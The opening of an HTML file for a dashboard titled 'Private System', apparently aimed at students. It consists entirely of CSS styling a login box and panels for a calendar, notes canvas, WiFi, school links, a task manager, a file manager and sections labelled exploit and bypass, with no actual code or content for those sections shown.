<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Base Styles - Expanded */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* More modern font stack */
      margin: 0;
      padding: 0;
      scrollbar-width: thin; /* Standard */
      scrollbar-color: #444 #222; /* Thumb Track */
    }

    /* For Chrome, Edge and Safari */
    *::-webkit-scrollbar {
      width: 12px;
    }

    *::-webkit-scrollbar-track {
      background: #222;
      border-radius: 6px;
    }

    *::-webkit-scrollbar-thumb {
      background-color: #444;
      border-radius: 6px;
      border: 3px solid #222;
    }

    body {
      overflow-x: hidden; /* Prevent horizontal scroll */
    }

    /* Login System Styles - Slightly Refined */
    body.login-body {
      margin: 0; padding: 0;
      background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%); /* Darker gradient */
      color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: 'Courier New', Courier, monospace; /* Keep original for title */
    }
    
    .login-box {
      background: rgba(0, 0, 0, 0.8); /* Slightly transparent */
      border-radius: 15px;
      border: 3px solid #4CAF50; /* Green accent */
      box-shadow: 0 0 25px rgba(76, 175, 80, 0.6), 0 0 10px rgba(76, 175, 80, 0.3); /* More pronounced shadow */
      width: 380px;
      padding: 40px 35px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-out;
      backdrop-filter: blur(5px); /* Glassmorphism effect */
      -webkit-backdrop-filter: blur(5px);
    }
    
    .login-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 35px rgba(76, 175, 80, 0.8), 0 0 15px rgba(76, 175, 80, 0.4);
    }
    
    .login-box.flashing {
      animation: flashGreen 0.4s ease-in-out 2; /* Changed to green flash */
    }
    
    @keyframes flashGreen {
      0%, 100% { border-color: #f44336; box-shadow: 0 0 25px #f44336, 0 0 10px #f44336; } /* Red flash on failure */
      50% { border-color: #4CAF50; box-shadow: 0 0 15px #4CAF50, 0 0 5px #4CAF50; }
    }
    
    .login-box h2 {
      font-size: 2.2em;
      margin-bottom: 30px;
      letter-spacing: 2px;
      text-shadow: 0 0 8px #4CAF50; /* Green glow for title */
      font-family: 'Courier New', monospace;
    }
    
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      background: rgba(255, 255, 255, 0.1); /* Subtle white input background */
      border: 1px solid rgba(76, 175, 80, 0.5); /* Green border */
      color: #e0e0e0;
      border-radius: 8px;
      font-size: 1em;
      transition: all 0.3s ease;
      outline: none; /* Remove default outline */
    }

    .login-box input[type="text"]:focus,
    .login-box input[type="password"]:focus {
      border-color: #4CAF50; /* Solid green on focus */
      box-shadow: 0 0 10px rgba(76, 175, 80, 0.7);
      background: rgba(255, 255, 255, 0.15);
      transform: scale(1.02);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.95em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      justify-content: center; /* Center label content */
    }
    
    #showPassword:checked + span {
      color: #4CAF50; /* Green when checked */
    }
    
    .login-box button {
      width: 100%;
      padding: 15px;
      background-color: #4CAF50; /* Green button */
      color: white;
      font-size: 1.1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: bold;
      box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
    }

    .login-box button:hover {
      background-color: #45a049; /* Darker green on hover */
      box-shadow: 0 8px 20px rgba(76, 175, 80, 0.6);
      transform: translateY(-2px);
    }

    .attempt-counter, .error-message {
      margin-top: 15px;
      font-size: 0.9em;
      color: #ff4d4d; /* Red for errors */
      min-height: 1.2em; /* Reserve space */
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 25px;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.85); /* Darker popup */
      border: 3px solid #4CAF50; /* Green border */
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(76, 175, 80, 0.7); /* Green shadow */
      z-index: 10;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      text-align: center;
    }
    
    .popup p {
      margin-bottom: 20px;
      font-size: 1.1em;
      color: #e0e0e0;
    }
    
    .popup input {
      margin-bottom: 15px;
      padding: 12px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(76, 175, 80, 0.4);
      color: #e0e0e0;
      border-radius: 6px;
      font-size: 0.95em;
    }

    .popup button {
      padding: 12px 20px;
      background-color: #f44336; /* Red for reset button */
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .popup button:hover {
      background-color: #d32f2f;
      transform: translateY(-1px);
      box-shadow: 0 3px 10px rgba(211, 47, 47, 0.5);
    }

    /* Dashboard Styles - Revamped */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap'); /* Added Roboto Mono */

    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a; /* Dark background */
      color: #f0f0f0; /* Light text */
      padding: 25px;
      transition: background-color 0.4s, color 0.4s;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      zoom: 1; 
      overflow-y: auto; /* Allow scrolling */
    }

    body.dashboard-body.light-theme {
      background-color: #f5f5f5; /* Light background */
      color: #1a1a1a; /* Dark text */
    }
    
    /* Scrollbar for dashboard content */
    body.dashboard-body::-webkit-scrollbar-track {
      background: #222;
    }
    body.dashboard-body::-webkit-scrollbar-thumb {
      background-color: #ff914d;
    }
    body.dashboard-body.light-theme::-webkit-scrollbar-track {
      background: #e0e0e0;
    }
    body.dashboard-body.light-theme::-webkit-scrollbar-thumb {
      background-color: #b36b3b; /* Brownish for light theme */
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: linear-gradient(90deg, #ff914d 0%, #ff6b6b 100%); /* Orange to Red gradient */
      padding: 18px 30px;
      border-radius: 15px;
      color: #000;
      margin-bottom: 30px;
      box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4);
      animation: headerGlow 5s infinite alternate; /* Subtle glow */
    }

    @keyframes headerGlow {
      0% { box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4); }
      50% { box-shadow: 0 8px 30px rgba(255, 99, 71, 0.6); }
      100% { box-shadow: 0 5px 20px rgba(255, 145, 77, 0.4); }
    }

    .dashboard-header h1 {
      font-size: 28px;
      font-weight: 700;
      letter-spacing: 1px;
      text-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    .user-info {
      font-weight: 700;
      font-size: 1.1em;
      color: #333;
      text-shadow: 0 1px 3px rgba(255,255,255,0.3);
    }

    .version-box {
      background: #ffd966;
      padding: 10px 18px;
      border-radius: 10px;
      color: #000;
      font-weight: 700;
      font-size: 0.95em;
      box-shadow: 0 2px 8px rgba(255, 217, 102, 0.5);
      animation: pulseYellow 3s infinite;
    }

    @keyframes pulseYellow {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    /* Quick Bar - Expanded and Styled */
    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 25px; 
      flex-wrap: wrap;
      padding: 10px;
      background: rgba(30, 30, 30, 0.5); /* Semi-transparent background for the bar */
      border-radius: 12px;
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    body.dashboard-body.light-theme .quick-bar {
      background: rgba(220, 220, 220, 0.6);
    }

    .quick-bar button {
      background-color: #ff914d; /* Primary button color */
      border: none;
      padding: 12px 18px;
      border-radius: 10px;
      color: #000; /* Black text */
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      min-width: 130px; /* Slightly wider buttons */
      white-space: nowrap;
      font-size: 0.95em;
      box-shadow: 0 3px 10px rgba(255, 145, 77, 0.3);
    }

    .quick-bar button:hover {
      background-color: #ffb67a; /* Lighter orange on hover */
      transform: translateY(-3px) scale(1.03);
      box-shadow: 0 6px 15px rgba(255, 145, 77, 0.5);
    }
    
    /* Specific quick bar buttons */
    #panicBtn {
      background: #ff4d4d !important;
      color: white !important;
      box-shadow: 0 3px 10px rgba(255, 77, 77, 0.4) !important;
    }
    #panicBtn:hover {
      background: #ff3333 !important;
      box-shadow: 0 6px 15px rgba(255, 77, 77, 0.6) !important;
    }

    #themeToggle {
      background-color: #505050; /* Dark grey for theme toggle */
      color: #f0f0f0;
      box-shadow: 0 3px 10px rgba(80, 80, 80, 0.3);
    }
    #themeToggle:hover {
      background-color: #666666;
      box-shadow: 0 6px 15px rgba(80, 80, 80, 0.5);
    }
    body.dashboard-body.light-theme #themeToggle {
      background-color: #cccccc;
      color: #1a1a1a;
      box-shadow: 0 3px 10px rgba(200, 200, 200, 0.3);
    }
     body.dashboard-body.light-theme #themeToggle:hover {
      background-color: #dddddd;
      box-shadow: 0 6px 15px rgba(200, 200, 200, 0.5);
    }

    /* Announcement Bar - Enhanced */
    .announcement-bar {
      width: 100%;
      background: linear-gradient(90deg, #ff914d 0%, #ff6b6b 100%); /* Same gradient as header */
      color: #000;
      font-weight: bold;
      padding: 12px 0;
      overflow: hidden;
      position: relative;
      border-radius: 12px;
      box-sizing: border-box;
      margin-bottom: 30px;
      user-select: none;
      height: 40px; /* Slightly taller */
      line-height: 16px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(255, 145, 77, 0.3);
      animation: announcementGlow 6s infinite alternate;
    }

    @keyframes announcementGlow {
      0% { box-shadow: 0 4px 15px rgba(255, 145, 77, 0.3); }
      50% { box-shadow: 0 6px 25px rgba(255, 99, 71, 0.5); }
      100% { box-shadow: 0 4px 15px rgba(255, 145, 77, 0.3); }
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 20s linear infinite; /* Slower scroll */
      padding-left: 100%;
      font-size: 1.1em; /* Larger font */
      letter-spacing: 0.5px;
    }

    @keyframes scrollLeft {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-100%); }
    }

    body.dashboard-body.light-theme .announcement-bar {
      background: #ffd966; /* Yellow */
      color: #000;
      box-shadow: 0 4px 15px rgba(255, 217, 102, 0.5);
    }
    body.dashboard-body.light-theme .announcement-bar span {
      animation: scrollLeft 20s linear infinite; /* Same animation */
    }
    body.dashboard-body.light-theme .announcement-bar:hover span {
        animation-play-state: paused; /* Pause on hover */
    }

    /* Main Grid / Section Layout */
    .main-row {
      display: flex;
      gap: 25px;
      margin-bottom: 25px;
      flex-wrap: wrap; /* Allow wrapping */
      justify-content: center; /* Center items if they wrap */
    }

    .box {
      background-color: #2a2a2a; /* Darker box background */
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5); /* Stronger shadow */
      min-height: 150px; /* Increased min height */
      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); /* Smoother transitions */
      flex: 1 1 350px; /* More flexible sizing */
      display: flex;
      flex-direction: column; /* Stack content vertically */
      border: 1px solid rgba(255, 145, 77, 0.2); /* Subtle border */
    }

    .box:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7);
    }
    
    /* Specific box styling for interactive panels */
    .box.interactive {
      cursor: pointer;
    }
    .box.interactive:hover {
      border-color: #ff914d; /* Highlight on hover */
    }

    body.dashboard-body.light-theme .box {
      background-color: #ffffff; /* White boxes for light theme */
      color: #1a1a1a;
      box-shadow: 0 5px 20px rgba(255, 145, 77, 0.2); /* Lighter shadow */
      border: 1px solid rgba(180, 110, 60, 0.2);
    }
    body.dashboard-body.light-theme .box:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(255, 145, 77, 0.2);
      border-color: #b36b3b; /* Brown border for light theme */
    }

    .box h2 {
      font-size: 22px;
      margin-bottom: 15px;
      color: #ffbf80; /* Lighter orange for titles */
      font-weight: 700;
      text-shadow: 0 1px 3px rgba(0,0,0,0.2);
      display: flex;
      align-items: center;
      gap: 10px;
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00; /* Darker brown for titles */
    }

    .box p, .box ul {
      font-size: 15px;
      line-height: 1.6;
    }
    
    .box-content { /* Wrapper for content inside boxes */
      flex-grow: 1; /* Allows content to expand */
    }

    .update-entry {
      background: #40210f; /* Dark brown */
      padding: 10px 12px;
      margin-top: 8px;
      border-radius: 8px;
      color: #ffccb3; /* Light peach */
      font-size: 14px;
      border-left: 4px solid #ff914d; /* Accent */
      transition: all 0.3s ease;
    }
    .update-entry:hover {
      background: #4a2411;
      transform: translateX(5px);
    }

    body.dashboard-body.light-theme .update-entry {
      background: #fff0e6; /* Lighter peach */
      color: #994d00;
      border-left: 4px solid #b36b3b; /* Brown accent */
    }
    body.dashboard-body.light-theme .update-entry:hover {
      background: #fef7f5;
      transform: translateX(5px);
    }

    /* Calendar - Enhanced */
    .calendar-container { /* Wrapper for calendar */
      background-color: #2a2a2a;
      padding: 25px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
      flex: 1 1 350px;
      display: flex;
      flex-direction: column;
      border: 1px solid rgba(255, 145, 77, 0.2);
    }
    body.dashboard-body.light-theme .calendar-container {
        background-color: #ffffff;
        border: 1px solid rgba(180, 110, 60, 0.2);
    }
    .calendar-container:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7);
    }
    body.dashboard-body.light-theme .calendar-container:hover {
      box-shadow: 0 12px 30px rgba(255, 145, 77, 0.2);
      border-color: #b36b3b;
    }
    .calendar-container h2 {
        font-size: 22px;
        margin-bottom: 15px;
        color: #ffbf80;
        font-weight: 700;
        text-shadow: 0 1px 3px rgba(0,0,0,0.2);
        display: flex;
        align-items: center;
        gap: 10px;
    }
    body.dashboard-body.light-theme .calendar-container h2 {
        color: #994d00;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 8px; /* Increased gap */
      text-align: center;
      font-size: 14px; /* Slightly larger font */
      flex-grow: 1; /* Allow calendar to fill available space */
    }

    .calendar .day-header { /* Header for days of week */
      background: rgba(255, 145, 77, 0.2); /* Subtle orange background */
      color: #ff914d;
      padding: 8px;
      border-radius: 6px;
      font-weight: 700;
      font-size: 13px;
      text-transform: uppercase;
    }

    body.dashboard-body.light-theme .calendar .day-header {
      background: rgba(179, 107, 59, 0.1);
      color: #994d00;
    }

    .calendar div:not(.day-header) { /* Calendar day cells */
      padding: 10px;
      background: #3a3a3a;
      border-radius: 8px;
      transition: all 0.3s ease;
      min-height: 40px; /* Ensure cells have some height */
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: default; /* Default cursor */
    }
    .calendar div:not(.day-header):not(.empty-day):hover {
      background: #4a4a4a;
      transform: translateY(-3px) scale(1.03);
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      cursor: pointer; /* Pointer on hover if it's an actual day */
    }

    body.dashboard-body.light-theme .calendar div:not(.day-header) {
      background: #f5f5f5;
      border: 1px solid #eee;
    }
    body.dashboard-body.light-theme .calendar div:not(.day-header):not(.empty-day):hover {
      background: #eeeeee;
      transform: translateY(-3px) scale(1.03);
      box-shadow: 0 4px 10px rgba(255, 145, 77, 0.1);
      border-color: #b36b3b;
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: #000;
      border: 2px solid #fff; /* White border to stand out */
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.7) !important; /* Glow effect */
    }
    .today:hover {
      background: #ffb67a !important; /* Lighter on hover */
      transform: translateY(-3px) scale(1.03);
      border-color: #eee;
    }

    body.dashboard-body.light-theme .today {
      background: #994d00 !important; /* Dark brown for today */
      color: #ffd966; /* Yellow text */
      border: 2px solid #ffd966; /* Yellow border */
      box-shadow: 0 0 15px rgba(153, 77, 0, 0.7) !important; /* Darker brown glow */
    }
     body.dashboard-body.light-theme .today:hover {
      background: #b36b3b !important; /* Brown on hover */
      border-color: #fff;
    }

    .empty-day { /* For days before first day of month */
        background: transparent !important;
        border: none !important;
        box-shadow: none !important;
        cursor: default !important;
    }
    .empty-day:hover {
        transform: none !important;
        box-shadow: none !important;
    }

    /* Motivation Box */
    .motivation-box {
      background-color: #303030; /* Darker grey */
      color: #ffd966; /* Yellow */
      padding: 30px; /* More padding */
      border-radius: 15px;
      font-style: italic;
      font-size: 1.2em; /* Larger font */
      box-shadow: 0 5px 20px rgba(255, 217, 102, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 150px; /* Match other boxes */
      text-align: center;
      font-family: 'Roboto Mono', monospace; /* Using Roboto Mono */
      border: 1px solid rgba(255, 217, 102, 0.2);
    }
    .motivation-box:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(255, 217, 102, 0.5);
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff0e6; /* Light peach */
      color: #994d00; /* Dark brown */
      box-shadow: 0 5px 20px rgba(179, 107, 59, 0.2);
      border: 1px solid rgba(179, 107, 59, 0.2);
    }
    body.dashboard-body.light-theme .motivation-box:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(179, 107, 59, 0.3);
    }

    /* Updates & Notifications Section */
    #updatesNotifications {
      display: flex;
      gap: 25px;
      justify-content: center;
      flex-wrap: wrap; /* Allow wrapping */
      margin-top: 30px;
    }

    /* Canvas Section */
    #canvasContainer {
      display: none; /* Hidden by default */
      margin-top: 30px;
      text-align: center;
      background-color: #2a2a2a;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 145, 77, 0.2);
      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
    }
    #canvasContainer:hover {
      transform: translateY(-8px);
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7);
    }

    body.dashboard-body.light-theme #canvasContainer {
      background-color: #ffffff;
      border: 1px solid rgba(180, 110, 60, 0.2);
    }
    body.dashboard-body.light-theme #canvasContainer:hover {
      box-shadow: 0 12px 30px rgba(255, 145, 77, 0.2);
      border-color: #b36b3b;
    }

    #notesCanvas {
      border: 2px dashed #ff914d; /* Dashed border */
      border-radius: 15px;
      background: #1f1f1f; /* Dark background for canvas */
      cursor: crosshair;
      touch-action: none; /* Prevent default touch actions */
      max-width: 100%; /* Responsive canvas */
      height: auto; /* Maintain aspect ratio */
      display: block; /* Center canvas */
      margin: 0 auto 20px auto;
    }
    body.dashboard-body.light-theme #notesCanvas {
      border: 2px dashed #b36b3b;
      background: #f0f0f0;
    }

    #canvasControls {
      margin-top: 15px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 10px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      margin: 0 8px;
      font-size: 0.9em;
    }
    #canvasControls button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }

    /* General Panel Styles */
    .info-panel {
      display: none; /* Hidden by default */
      background-color: #2a2a2a;
      padding: 30px;
      border-radius: 15px;
      margin-top: 30px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255, 145, 77, 0.2);
      transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
    }
    .info-panel:hover {
        transform: translateY(-8px);
        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.7);
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: #ffffff;
      border: 1px solid rgba(180, 110, 60, 0.2);
    }
    body.dashboard-body.light-theme .info-panel:hover {
        box-shadow: 0 12px 30px rgba(255, 145, 77, 0.2);
        border-color: #b36b3b;
    }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 20px;
      font-size: 24px;
      text-align: center;
      font-weight: 700;
      text-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #994d00;
    }

    /* Specific Panel Layouts */

    /* WiFi Panel */
    .wifi-grid, .wifi-entry {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); /* Responsive grid */
      gap: 12px;
      margin-bottom: 15px;
    }

    .wifi-grid div, .wifi-entry div {
      padding: 10px 15px;
      background: #3a3a3a;
      border-radius: 8px;
      text-align: center;
      font-weight: 600;
      font-size: 14px;
      transition: all 0.3s ease;
    }
    .wifi-grid div:hover, .wifi-entry div:hover {
        transform: translateY(-2px);
        background: #4a4a4a;
        box-shadow: 0 3px 8px rgba(0,0,0,0.3);
    }

    body.dashboard-body.light-theme .wifi-grid div,
    body.dashboard-body.light-theme .wifi-entry div {
      background: #f5f5f5;
      border: 1px solid #eee;
      color: #333;
    }
    body.dashboard-body.light-theme .wifi-grid div:hover,
    body.dashboard-body.light-theme .wifi-entry div:hover {
        background: #eeeeee;
        box-shadow: 0 3px 8px rgba(255, 145, 77, 0.1);
        border-color: #b36b3b;
    }

    /* Handbook, Student/Teacher Websites Panels */
    .handbook-buttons, .links-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Responsive grid */
      gap: 15px;
      margin-top: 20px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 12px 20px;
      border-radius: 10px;
      color: #000;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      text-decoration: none;
      text-align: center;
      font-size: 1em;
      box-shadow: 0 3px 10px rgba(255, 145, 77, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover {
      background-color: #ffb67a;
      transform: translateY(-3px) scale(1.02);
      box-shadow: 0 6px 15px rgba(255, 145, 77, 0.5);
    }

    body.dashboard-body.light-theme .handbook-buttons button,
    body.dashboard-body.light-theme .links-list a,
    body.dashboard-body.light-theme .exploit-buttons a,
    body.dashboard-body.light-theme .bypass-buttons button {
        background-color: #b36b3b; /* Brown */
        color: #ffd966; /* Yellow */
        box-shadow: 0 3px 10px rgba(179, 107, 59, 0.3);
    }
    body.dashboard-body.light-theme .handbook-buttons button:hover,
    body.dashboard-body.light-theme .links-list a:hover,
    body.dashboard-body.light-theme .exploit-buttons a:hover,
    body.dashboard-body.light-theme .bypass-buttons button:hover {
        background-color: #994d00; /* Darker brown */
        transform: translateY(-3px) scale(1.02);
        box-shadow: 0 6px 15px rgba(179, 107, 59, 0.5);
    }

    /* Exploit Panel */
    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }

    /* Bypass Panel */
    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }

    .coming-soon {
      background: #40210f;
      padding: 20px; /* More padding */
      border-radius: 10px;
      margin-top: 20px;
      text-align: center;
      font-weight: 700;
      font-size: 1.1em;
      box-shadow: inset 0 0 15px rgba(64, 33, 15, 0.5); /* Inner glow */
    }

    body.dashboard-body.light-theme .coming-soon {
      background: #fff0e6;
      box-shadow: inset 0 0 15px rgba(255, 224, 192, 0.5);
    }

    .info-text {
      background: #40210f;
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      font-size: 14px;
      line-height: 1.7;
      border-left: 5px solid #ff914d;
    }
    .info-text p {
        margin-bottom: 10px;
    }
    .info-text p:last-child {
        margin-bottom: 0;
    }

    body.dashboard-body.light-theme .info-text {
      background: #fff0e6;
      border-left: 5px solid #b36b3b;
    }

    /* School Info Grid */
    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); /* Responsive grid */
      gap: 15px;
      margin-top: 20px;
    }

    .school-info-item {
      background: #40210f;
      padding: 15px;
      border-radius: 10px;
      border-left: 4px solid #ff914d;
    }
    body.dashboard-body.light-theme .school-info-item {
      background: #fff0e6;
      border-left: 4px solid #b36b3b;
    }

    .school-info-label {
      font-weight: 700;
      color: #ff914d;
      margin-bottom: 8px;
      display: block; /* Ensure it's on its own line */
    }
    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }

    /* iPad Options & Content */
    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 20px;
      justify-content: center;
    }

    .ipad-options button {
      flex: 1;
      background-color: #ff914d;
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 3px 10px rgba(255, 145, 77, 0.3);
    }
    .ipad-options button:hover {
      background-color: #ffb67a;
      transform: translateY(-2px);
    }

    .ipad-content, .bypass-content {
      display: none;
      background: #40210f;
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
      border-left: 4px solid #ff914d;
    }
    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #fff0e6;
      border-left: 4px solid #b36b3b;
    }

    /* --- NEW SECTIONS AND STYLES --- */

    /* System Monitoring Panel */
    .sys-monitor-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 20px;
      margin-top: 20px;
    }
    .monitor-item {
      background: #3a3a3a;
      padding: 18px;
      border-radius: 10px;
      border-left: 5px solid #ff914d;
      transition: all 0.3s ease;
    }
    .monitor-item:hover {
      transform: translateY(-5px);
      box-shadow: 0 8px 15px rgba(0,0,0,0.4);
    }
    body.dashboard-body.light-theme .monitor-item {
      background: #f5f5f5;
      border-left: 5px solid #b36b3b;
    }
    body.dashboard-body.light-theme .monitor-item:hover {
      box-shadow: 0 8px 15px rgba(255, 145, 77, 0.1);
    }

    .monitor-item h3 {
      font-size: 1.1em;
      margin-bottom: 15px;
      color: #ffbf80;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    body.dashboard-body.light-theme .monitor-item h3 {
      color: #994d00;
    }
    .monitor-item h3 .icon {
      font-size: 1.3em;
    }

    /* Progress Bar Styling */
    .progress-bar-container {
      background-color: #4a4a4a;
      border-radius: 10px;
      overflow: hidden;
      height: 25px;
      width: 100%;
      margin-top: 10px;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.3);
    }
    body.dashboard-body.light-theme .progress-bar-container {
      background-color: #eeeeee;
      box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
    }

    .progress-bar {
      height: 100%;
      background-color: #4CAF50; /* Default Green */
      border-radius: 10px;
      text-align: center;
      line-height: 25px;
      color: white;
      font-weight: bold;
      font-size: 0.9em;
      transition: width 0.5s ease-out, background-color 0.5s ease-out;
      width: 0%; /* Start at 0 */
    }
    .progress-bar.high { background-color: #ff9800; } /* Orange */
    .progress-bar.critical { background-color: #f44336; } /* Red */

    /* Task Manager Panel */
    .task-manager-table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      font-size: 13px;
    }
    .task-manager-table th, .task-manager-table td {
      padding: 12px 15px;
      text-align: left;
      border-bottom: 1px solid #4a4a4a;
    }
    body.dashboard-body.light-theme .task-manager-table th,
    body.dashboard-body.light-theme .task-manager-table td {
      border-bottom: 1px solid #eee;
    }
    .task-manager-table th {
      background-color: #4a4a4a;
      color: #ffbf80;
      font-weight: 700;
      border-top-left-radius: 10px;
      border-top-right-radius: 10px;
    }
    body.dashboard-body.light-theme .task-manager-table th {
      background-color: #f5f5f5;
      color: #994d00;
    }
    .task-manager-table tbody tr {
      transition: background-color 0.3s ease;
    }
    .task-manager-table tbody tr:hover {
      background-color: #404040;
    }
    body.dashboard-body.light-theme .task-manager-table tbody tr:hover {
      background-color: #eeeeee;
    }
    .task-manager-table .task-actions button {
      background: none;
      border: none;
      color: #ff4d4d;
      cursor: pointer;
      font-size: 1.2em;
      transition: color 0.3s ease;
    }
    .task-manager-table .task-actions button:hover {
      color: #ff0000;
    }

    /* File Manager Panel */
    .file-manager-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }
    .fm-header {
      display: flex;
      gap: 10px;
      align-items: center;
    }
    .fm-header button { /* New Task button */
      background-color: #4CAF50;
      padding: 8px 12px;
      border-radius: 6px;
      color: white;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
    }
    .fm-header button:hover {
      background-color: #45a049;
      transform: translateY(-2px);
    }
    body.dashboard-body.light-theme .fm-header button {
      background-color: #b36b3b;
    }
    body.dashboard-body.light-theme .fm-header button:hover {
      background-color: #994d00;
    }

    .file-list {
      background: #3a3a3a;
      padding: 15px;
      border-radius: 8px;
      max-height: 300px; /* Scrollable file list */
      overflow-y: auto;
    }
    body.dashboard-body.light-theme .file-list {
      background: #f5f5f5;
      border: 1px solid #eee;
    }
    .file-list ul { list-style: none; }
    .file-list li {
      padding: 10px 12px;
      margin-bottom: 5px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .file-list li:hover {
      background: #4a4a4a;
      transform: translateX(5px);
    }
    body.dashboard-body.light-theme .file-list li:hover {
      background: #eeeeee;
      transform: translateX(5px);
      border-color: #b36b3b;
    }
    .file-list li .icon { /* For file/folder icons */
      font-size: 1.2em;
    }
    .file-list li .folder .icon { color: #ffd966; } /* Yellow for folders */
    .file-list li .file .icon { color: #4CAF50; } /* Green for files */
    body.dashboard-body.light-theme .file-list li .folder .icon { color: #994d00; }
    body.dashboard-body.light-theme .file-list li .file .icon { color: #45a049; }

